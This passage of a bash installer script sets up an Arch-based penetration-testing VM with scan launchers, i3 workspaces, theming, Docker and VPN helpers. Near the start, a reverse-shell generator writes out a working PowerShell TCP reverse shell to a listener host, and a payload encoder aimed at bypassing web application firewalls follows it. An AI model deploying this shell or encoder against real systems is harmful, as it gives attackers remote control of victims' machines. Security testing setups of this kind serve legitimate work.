echo "powershell -nop -c \"\$client=New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length)) -ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""
EOFSH
  chmod +x ~/exploits/scripts/reverse_shell_generator.sh
  
  # Payload encoder
  cat > ~/exploits/scripts/payload_encoder.py << 'EOFPY'
#!/usr/bin/env python3
"""Payload encoder for WAF bypass"""
import base64
import urllib.parse
import sys

def encode(payload):
    print(f"Original: {payload}\n")
    print(f"Base64: {base64.b64encode(payload.encode()).decode()}")
    print(f"URL: {urllib.parse.quote(payload)}")
    print(f"Double URL: {urllib.parse.quote(urllib.parse.quote(payload))}")
    print(f"Hex: {''.join([hex(ord(c))[2:] for c in payload])}")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        encode(sys.argv[1])
    else:
        print("Usage: ./payload_encoder.py 'payload'")
EOFPY
  chmod +x ~/exploits/scripts/payload_encoder.py
  
  # README
  cat > ~/exploits/README.md << 'EOFMD'
# Exploit Templates

Quick-start templates for common exploitation scenarios.

## Directory Structure
- `web/` - Web exploits (SQLi, LFI, XXE)
- `binary/` - Binary exploitation (ROP, shellcode)
- `windows/` - Windows techniques (lateral movement, AD)
- `linux/` - Linux privilege escalation
- `scripts/` - Utility scripts

## Usage
1. Copy template to pentest directory
2. Edit TARGET/PARAM placeholders
3. Run and iterate
4. Document in notes/
EOFMD
  
  log "[exploits] Done. Templates in ~/exploits/"
}

module_workflow(){
  log "[workflow] Creating pentest workspace automation..."
  
  mkdir -p ~/.local/bin
  
  # Pentest workspace creator
  cat > ~/.local/bin/pentest-workspace << 'EOFSCRIPT'
#!/bin/bash
# Automated pentest workspace setup

TARGET=$1

if [ -z "$TARGET" ]; then
    echo "Usage: pentest-workspace <target-ip-or-name>"
    exit 1
fi

WORKSPACE=~/pentest/$TARGET
mkdir -p $WORKSPACE/{recon,scans,loot,screenshots,notes}
cd $WORKSPACE

# Workspace 1: Recon
i3-msg "workspace 1:recon; exec kitty -e bash -c 'rustscan -a $TARGET -- -sC -sV -oN scans/nmap-initial.txt'" 2>/dev/null

# Workspace 2: Enum
i3-msg "workspace 2:enum; exec kitty" 2>/dev/null

# Workspace 3: Exploit
i3-msg "workspace 3:exploit; exec firefox" 2>/dev/null

# Workspace 4: Post
i3-msg "workspace 4:post; exec kitty" 2>/dev/null

# Workspace 5: Notes
cat > notes/$TARGET-notes.md << NOTES
# Pentest Notes: $TARGET

## Target Information
- IP: $TARGET
- Date: $(date)

## Reconnaissance
- [ ] Port scan
- [ ] Service enumeration
- [ ] Web enumeration

## Vulnerabilities Found

## Exploitation Attempts

## Post-Exploitation

## Credentials
NOTES

i3-msg "workspace 5:notes; exec kitty -e nvim notes/$TARGET-notes.md" 2>/dev/null

notify-send "Pentest Workspace" "Environment ready for $TARGET" 2>/dev/null
echo "[+] Workspace created: $WORKSPACE"
EOFSCRIPT
  chmod +x ~/.local/bin/pentest-workspace
  
  # Quick scan launcher
  cat > ~/.local/bin/quick-scan << 'EOFSCRIPT'
#!/bin/bash
# Quick scan launcher

if ! command -v rofi &>/dev/null; then
    echo "Error: rofi not installed"
    exit 1
fi

TARGET=$(echo "" | rofi -dmenu -p "Target IP/Domain:")

if [ -z "$TARGET" ]; then
    exit 0
fi

SCAN_TYPE=$(echo -e "Quick Scan\nFull Scan\nWeb Enum\nFull Workspace" | rofi -dmenu -p "Scan Type:")

case "$SCAN_TYPE" in
    "Quick Scan")
        kitty --class floating-term -e bash -c "rustscan -a $TARGET -- -sC -sV; read -p 'Press enter to close'"
        ;;
    "Full Scan")
        kitty --class floating-term -e bash -c "sudo nmap -p- -sC -sV -A -T4 $TARGET -oN ~/pentest/$TARGET-full.txt; read -p 'Press enter'"
        ;;
    "Web Enum")
        kitty --class floating-term -e bash -c "gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt; read -p 'Press enter'"
        ;;
    "Full Workspace")
        pentest-workspace $TARGET
        ;;
esac
EOFSCRIPT
  chmod +x ~/.local/bin/quick-scan
  
  # Add keybinding to i3 config
  if [ -f ~/.config/i3/config ]; then
    if ! grep -q "quick-scan" ~/.config/i3/config; then
      echo "" >> ~/.config/i3/config
      echo "# Quick pentest launcher" >> ~/.config/i3/config
      echo "bindsym \$mod+p exec --no-startup-id quick-scan" >> ~/.config/i3/config
      echo "bindsym \$mod+grave exec kitty --class floating-term" >> ~/.config/i3/config
    fi
  fi
  
  log "[workflow] Done. Commands: pentest-workspace, quick-scan"
  info "Keybind: Super+P for quick-scan"
}

module_theming(){
  log "[theming] Final theme polish..."
  
  # GTK theme (optional)
  if command -v yay &>/dev/null; then
    info "Installing Nordic GTK theme..."
    timeout 600 yay -S --noconfirm nordic-theme 2>&1 | tee -a "$INSTALL_LOG" || warn "Nordic theme not available"
  fi
  
  # Set GTK settings
  mkdir -p ~/.config/gtk-3.0
  cat > ~/.config/gtk-3.0/settings.ini << 'EOF'
[Settings]
gtk-theme-name=Nordic
gtk-icon-theme-name=Papirus-Dark
gtk-font-name=JetBrainsMono Nerd Font 10
gtk-cursor-theme-name=Adwaita
gtk-application-prefer-dark-theme=1
EOF
  
  log "[theming] Done."
}

module_docker(){
  log "[docker] Installing Docker (NOT enabled by default)..."
  
  install_pacman_pkgs "${PACMAN_DOCKER[@]}"
  
  # Add user to docker group
  sudo usermod -aG docker "$USER" 2>/dev/null || warn "Failed to add user to docker group"
  
  # Create helper scripts
  sudo tee /usr/local/bin/docker-on >/dev/null << 'EOF'
#!/bin/bash
sudo systemctl start docker
echo "Docker started"
EOF
  
  sudo tee /usr/local/bin/docker-off >/dev/null << 'EOF'
#!/bin/bash
sudo systemctl stop docker
echo "Docker stopped"
EOF
  
  sudo chmod +x /usr/local/bin/docker-{on,off}
  
  log "[docker] Installed. Use 'docker-on' to start, 'docker-off' to stop"
  warn "You may need to log out and back in for docker group to take effect"
}

module_vpn(){
  log "[vpn] Installing VPN tools..."
  
  install_pacman_pkgs "${PACMAN_VPN[@]}"
  
  # VPN helper scripts
  mkdir -p ~/.local/bin
  cat > ~/.local/bin/vpn-up << 'EOFSCRIPT'
#!/bin/bash
if [ -z "$1" ]; then
    echo "Usage: vpn-up <config.ovpn>"
    exit 1
fi
CONFIG="$1"
if [[ "$CONFIG" == *.ovpn ]]; then
    sudo openvpn --config "$CONFIG"
else
    echo "For WireGuard: sudo wg-quick up <config>"
fi
EOFSCRIPT
  
  cat > ~/.local/bin/vpn-down << 'EOFSCRIPT'
#!/bin/bash
sudo pkill openvpn || true
echo "OpenVPN stopped"
EOFSCRIPT
  
  chmod +x ~/.local/bin/vpn-{up,down}
  
  log "[vpn] Done. Commands: vpn-up <config>, vpn-down"
}

# ------------------ CLI & Execution ------------------

show_help(){
  cat <<EOF
skidstall.sh - Neon Nord Pentest VM installer

Usage:
  ./skidstall.sh              # interactive
  ./skidstall.sh --auto --modules ui,pentest,lazyvim
  ./skidstall.sh --update --modules pentest

Options:
  --auto             Run without prompts (requires --modules)
  --modules a,b,c    Comma-separated modules to install
  --update           Update existing installation
  -h, --help         Show this help

Available modules (in dependency order):
  ${MODULE_EXECUTION_ORDER[*]}

Module descriptions:
  core       - System update, base-devel, git
  dev        - Python, pip, pipx, neovim, compilers
  vmtools    - VMware guest tools
  networking - SSH client, network utilities
  ui         - i3, X server, HTB Neon Nord theme
  pentest    - All pentesting tools (nmap, burp, etc)
  lazyvim    - Neovim with LazyVim and Nord theme
  exploits   - Pre-built exploit templates
  workflow   - Workspace automation scripts
  theming    - GTK theme, final polish
  docker     - Docker (disabled by default)
  vpn        - OpenVPN, WireGuard

EOF
}

# Parse arguments
AUTO=false
UPDATE=false
MODULES=()

while [ $# -gt 0 ]; do
  case "$1" in
    --auto) AUTO=true; shift ;;
    --modules) shift; IFS=',' read -ra MODULES <<< "$1"; shift ;;
    --update) UPDATE=true; shift ;;
    -h|--help) show_help; exit 0 ;;
    *) err "Unknown argument: $1"; show_help; exit 1 ;;
  esac
done

# Show banner
show_banner

# Initialize install log
echo "Skidstall Installation Log - $(date)" > "$INSTALL_LOG"
info "Logging to: $INSTALL_LOG"

# Validate modules
if [ ${#MODULES[@]} -gt 0 ]; then
  for m in "${MODULES[@]}"; do
    if [[ ! " ${AVAILABLE_MODULES[*]} " =~ " $m " ]]; then
      err "Unknown module: $m"
      echo "Available: ${AVAILABLE_MODULES[*]}"
      exit 1
    fi
  done
fi

# Interactive selection if not auto and no modules
if ! $AUTO && [ ${#MODULES[@]} -eq 0 ] && ! $UPDATE; then
  echo ""
  info "Select modules to install:"
  echo ""
  
  MODULES=(core)  # Always include core
  
  for m in "${MODULE_EXECUTION_ORDER[@]}"; do
    if [ "$m" = "core" ]; then
      continue
    fi
    if confirm "  Install $m?"; then
      MODULES+=("$m")
    fi
  done
  echo ""
fi

# Default modules if none selected
if [ ${#MODULES[@]} -eq 0 ]; then
  MODULES=(core dev vmtools ui pentest lazyvim exploits workflow)
  warn "No modules selected, using defaults: ${MODULES[*]}"
fi

# Always run core first if not in update mode
if ! $UPDATE && [[ ! " ${MODULES[*]} " =~ " core " ]]; then
  MODULES=(core "${MODULES[@]}")
fi

# Handle update mode
if $UPDATE; then
  ensure_sudo
  log "Update mode: upgrading system packages..."
  sudo pacman -Syu --noconfirm 2>&1 | tee -a "$INSTALL_LOG"
  
  if command -v yay &>/dev/null; then
    log "Upgrading AUR packages..."
    yay -Syu --noconfirm 2>&1 | tee -a "$INSTALL_LOG" || warn "Some AUR upgrades failed"
  fi
  
  if command -v pipx &>/dev/null; then
    log "Upgrading pipx packages..."
    pipx upgrade-all 2>&1 | tee -a "$INSTALL_LOG" || warn "Some pipx upgrades failed"
  fi
  
  log "Update complete. Re-running selected modules..."
fi

# Sort modules by execution order
SORTED_MODULES=()
for order_mod in "${MODULE_EXECUTION_ORDER[@]}"; do
  for user_mod in "${MODULES[@]}"; do
    if [ "$order_mod" = "$user_mod" ]; then
      SORTED_MODULES+=("$order_mod")
      break
    fi
  done
done

# Execute modules in dependency order
log "Installing modules: ${SORTED_MODULES[*]}"
echo ""

for m in "${SORTED_MODULES[@]}"; do
  echo ""
  info "========================================="
  info "Module: $m"
  info "========================================="
  
  case "$m" in
    core) module_core ;;
    dev) module_dev ;;
    vmtools) module_vmtools ;;
    networking) module_networking ;;
    ui) module_ui ;;
    pentest) module_pentest ;;
    lazyvim) module_lazyvim ;;
    exploits) module_exploits ;;
    workflow) module_workflow ;;
    theming) module_theming ;;
    docker) module_docker ;;
    vpn) module_vpn ;;
    *) err "Unknown module: $m" ;;
  esac
done

# Show installation summary
show_install_summary

# Final summary
echo ""
echo -e "${GREEN}╔═══════════════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║              🎉 Installation Complete! 🎉                ║${NC}"
echo -e "${GREEN}╚═══════════════════════════════════════════════════════════╝${NC}"
echo ""
log "Modules installed: ${SORTED_MODULES[*]}"
echo ""
info "Next steps:"
echo "  1. Log out and back in (for group changes)"
echo "  2. Run: startx"
echo "  3. Use Super+P for quick scan menu"
echo "  4. Run: pentest-workspace <target-ip>"
echo ""
info "Key bindings:"
echo "  Super+Enter    - Terminal"
echo "  Super+D        - App launcher"
echo "  Super+P        - Quick scan menu"
echo "  Super+\`        - Floating terminal"
echo "  Super+1-5      - Workspaces (recon/enum/exploit/post/notes)"
echo ""
info "Commands:"
echo "  pentest-workspace <ip>  - Auto-setup full environment"
echo "  quick-scan              - Scan launcher"
echo "  vpn-up <config>         - Start VPN"
echo "  docker-on/docker-off    - Start/stop Docker"
echo ""
warn "Notes:"
echo "  • Picom NOT auto-started (VM performance)"
echo "  • Docker NOT enabled (use docker-on)"
echo "  • SSH server NOT enabled (use: sudo systemctl enable sshd)"
echo "  • Theme: HTB Neon Nord (#9fef00 green)"
echo ""
log "Happy hacking! 🚀"
